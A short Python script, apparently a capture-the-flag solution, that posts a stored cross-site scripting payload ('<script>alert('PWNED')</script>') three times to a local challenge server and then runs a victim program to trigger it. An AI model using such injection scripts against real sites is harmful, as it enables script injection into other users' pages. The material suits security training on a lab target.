#!/usr/bin/python3
import sys
import requests
import os
from urllib.parse import quote,urlencode

url = "http://challenge.localhost/"

def sender():
    data = {
"content":"<script>alert('PWNED')</script>"
}
    return requests.post(url,data=data).text


for _ in range(3):
    sender()

import os
res = os.system('/challenge/victim')
print(res)
